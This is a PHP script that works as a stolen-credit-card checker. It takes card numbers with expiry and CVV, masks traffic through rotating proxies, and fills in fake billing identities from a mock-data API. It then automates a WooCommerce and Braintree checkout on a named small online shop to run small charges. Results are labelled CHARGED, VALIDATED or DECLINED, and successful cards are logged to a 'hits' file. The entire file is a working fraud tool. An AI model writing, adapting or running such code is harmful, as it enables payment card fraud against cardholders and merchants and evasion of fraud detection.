<?php

error_reporting(1);
set_time_limit(0);

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

$proxyList = file('proxy.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
shuffle($proxyList);

foreach ($proxyList as $proxy)
list($hostname, $port, $username, $password) = explode(':', $proxy);

function extract_string($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function SID(){
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}
  
$separa = explode("|", $card);
$cc = $separa[0];
$mm = $separa[1];
$yy = $separa[2];
$cvv = $separa[3];

$retry = 0;
  retry:

$Cookies = tempnam("/tmp", "cookies");

$correlation_id = uniqid();

if($card) {
    $key = "bf1e2760";

    $country = 'united_states';

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://my.api.mockaroo.com/$country.json?key=$key",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HTTPGET => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $Cookies,
        CURLOPT_COOKIEJAR => $Cookies,
        CURLOPT_PROXY => "$hostname:$port",
        CURLOPT_PROXYUSERPWD => "$username:$password",
    ]);
    $curl1 = curl_exec($ch);

    $first = json_decode($curl1)->first;
    $last = json_decode($curl1)->last;
    $email = json_decode($curl1)->email;
    $phone = json_decode($curl1)->phone;
    $street = json_decode($curl1)->street;
    $zip = json_decode($curl1)->zip;
    $city = json_decode($curl1)->city;
    $state1 = json_decode($curl1)->state1;
    $state2 = json_decode($curl1)->state2;

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.ipify.org/",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HTTPGET => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $Cookies,
        CURLOPT_COOKIEJAR => $Cookies,
        CURLOPT_PROXY => "$hostname:$port",
        CURLOPT_PROXYUSERPWD => "$username:$password",
    ]);
    $curl2 = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://reinrespects.com/product/respect-our-parks-dog-bandana-with-a-cause/",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $Cookies,
        CURLOPT_COOKIEJAR => $Cookies,
        CURLOPT_PROXY => "$hostname:$port",
        CURLOPT_PROXYUSERPWD => "$username:$password",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Referer: https://reinrespects.com/product/respect-our-parks-dog-bandana-with-a-cause/",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"
        ],
        CURLOPT_POSTFIELDS => http_build_query([
            "attribute_pa_color" => "green",
            "wc_braintree_paypal_amount" => 8.95,
            "wc_braintree_paypal_currency"=> "USD",
            "wc_braintree_paypal_locale" => "en_us",
            "wc_braintree_paypal_single_use" => 1,
            "wc_braintree_paypal_product_id" => 690,
            "quantity" => 1,
            "add-to-cart" => 690,
            "product_id" => 690,
            "variation_id" => 701

        ])
    ]);
    $curl3 = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://reinrespects.com/checkout/",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HTTPGET => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $Cookies,
        CURLOPT_COOKIEJAR => $Cookies,
        CURLOPT_PROXY => "$hostname:$port",
        CURLOPT_PROXYUSERPWD => "$username:$password",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        ]
    ]);
    $curl4 = curl_exec($ch);
    
    $checkout_nonce = extract_string($curl4, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','"');
    $wcal_guest_capture_nonce = extract_string($curl4, '<input type="hidden" id="wcal_guest_capture_nonce" name="wcal_guest_capture_nonce" value="','"');
    $client_token_nonce = extract_string($curl4, '"client_token_nonce":"','"');

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://reinrespects.com/wp-admin/admin-ajax.php",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $Cookies,
        CURLOPT_COOKIEJAR => $Cookies,
        CURLOPT_PROXY => "$hostname:$port",
        CURLOPT_PROXYUSERPWD => "$username:$password",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Referer: https://reinrespects.com/checkout/",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"
        ],
        CURLOPT_POSTFIELDS => http_build_query([
            "action" => "wc_braintree_credit_card_get_client_token",
            "nonce" => $client_token_nonce

        ])
    ]);
    $curl5 = curl_exec($ch);

    $authorizationFingerprint = json_decode(base64_decode(extract_string($curl5, '{"success":true,"data":"','"')))->authorizationFingerprint;

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://payments.braintree-api.com/graphql",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $Cookies,
        CURLOPT_COOKIEJAR => $Cookies,
        CURLOPT_PROXY => "$hostname:$port",
        CURLOPT_PROXYUSERPWD => "$username:$password",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Referer: https://assets.braintreegateway.com/",
            "Content-Type: application/json",
            "Braintree-Version: 2018-05-10",
            "Authorization: Bearer $authorizationFingerprint"
        ],
        CURLOPT_POSTFIELDS => json_encode([
            "clientSdkMetadata" => [
                "source" => "client",
                "integration" => "custom",
                "sessionId" => SID()
            ],
            "query" => "mutation TokenizeCreditCard(\$input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: \$input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
            "variables" => [
                "input" => [
                    "creditCard" => [
                        "number" => $cc,
                        "expirationMonth" => $mm,
                        "expirationYear" => $yy,
                        "cvv" => $cvv
                    ],
                    "options" => [
                        "validate" => false
                    ]
                ]
            ],
            "operationName" => "TokenizeCreditCard"
        ])
    ]);
    $curl6 = curl_exec($ch);

    $token = json_decode($curl6)->data->tokenizeCreditCard->token;

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://reinrespects.com/?wc-ajax=checkout",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $Cookies,
        CURLOPT_COOKIEJAR => $Cookies,
        CURLOPT_PROXY => "$hostname:$port",
        CURLOPT_PROXYUSERPWD => "$username:$password",
        CURLOPT_HTTPHEADER => [
            "Accept: application/json, text/javascript, */*; q=0.01",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With: XMLHttpRequest",
            "Origin: https://reinrespects.com",
            "Referer: https://reinrespects.com/checkout/"
        ],
        CURLOPT_POSTFIELDS => http_build_query([
            "billing_first_name" => $first,
            "billing_last_name" => $last,
            "billing_country" => "US",
            "billing_address_1" => $street,
            "billing_city" => $city,
            "billing_state" => $state2,
            "billing_postcode" => $zip,
            "billing_phone" => $phone,
            "billing_email" => $email,
            "wcal_guest_capture_nonce" => $wcal_guest_capture_nonce,
            "_wp_http_referer" => "/checkout/",
            "mailchimp_woocommerce_newsletter" => 1,
            "shipping_country" => "US",
            "shipping_method[0]" => "free_shipping:2",
            "payment_method" => "braintree_credit_card",
            "wc-braintree-credit-card-card-type" => "visa",
            "wc-braintree-credit-card-3d-secure-order-total" => "8.95",
            "wc_braintree_credit_card_payment_nonce" => $token,
            "wc_braintree_paypal_amount" => "8.95",
            "wc_braintree_paypal_currency" => "USD",
            "wc_braintree_paypal_locale" => "en_us",
            "terms" => "on",
            "terms-field" => 1,
            "woocommerce-process-checkout-nonce" => $checkout_nonce,
            "_wp_http_referer" => "/?wc-ajax=update_order_review"
        ])
    ]);
    $curl7 = curl_exec($ch);

    $default = htmlentities(json_encode($curl7));
    $response = strip_tags(json_decode($curl7)->messages);
    $receipt = json_decode($curl7)->redirect;
    $receipturl = str_replace('\\', '', $receipt);

    if (strpos($curl7, "order-received")) {
        echo 'CHARGED ' . $card . ' <a href="' . $receipturl . '" target="_blank">Receipt</a> ' . $curl2 . '</br>';
        fwrite(fopen("hits/braintree ccn charge.txt", "a"), $card. "\r\n");
        ob_flush();
        unlink($Cookies);
        exit;
    } elseif(strpos($curl7, "The card verification number does not match. Please re-enter and try again.")) {
        echo "VALIDATED $card $response $curl2<br>";
        ob_flush();
        unlink($Cookies);
        exit;
    } elseif(strpos($curl7, "The provided address does not match the billing address for cardholder. Please verify the address and try again.")) {
        echo "VALIDATED $card $response $curl2<br>";
        ob_flush();
        unlink($Cookies);
        exit;
    } elseif($response == TRUE) {
        echo "DECLINED $card $response $curl2<br>";
        ob_flush();
        unlink($Cookies);
        exit;
    } else {
        echo "DECLINED $card $default</br>";
        ob_flush();
        unlink($Cookies);
        exit;
    }
}

?>

